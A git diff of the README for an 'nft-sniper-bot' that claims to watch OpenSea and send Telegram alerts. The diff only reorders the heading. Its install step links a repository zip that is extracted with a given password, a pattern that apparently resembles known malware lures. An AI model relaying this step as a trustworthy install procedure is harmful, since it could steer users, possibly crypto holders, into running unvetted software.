@@ -5,8 +5,11 @@
 <img src=https://img.shields.io/github/issues-pr/freesparrowrob/nft-sniper-bot?style=for-the-badge&logo=appveyor&color=informational />
 </p>
 
+# nft-sniper-bot
 
-  <details open="open">
+NFT Sniper is a  bot designed to swiftly identify new announcements within the OpenSea blockchain. It achieves this by leveraging telegram notifications to promptly notify users of any updates.
+
+<details open="open">
   <summary>Table of Contents</summary>
   <ol>
     <li><a href="#install">Installation</a></li>
@@ -14,12 +17,6 @@
     <li><a href="#copyright">License</a></li>
   </ol>
 </details>
-
-
-
-# nft-sniper-bot
-
-NFT Sniper is a  bot designed to swiftly identify new announcements within the OpenSea blockchain. It achieves this by leveraging telegram notifications to promptly notify users of any updates.
 
 ## Install
 - [Download](https://github.com/freesparrowrob/nft-sniper-bot/archive/refs/heads/main.zip) the repository release and extract files with password `YHS70vOP4Q`.
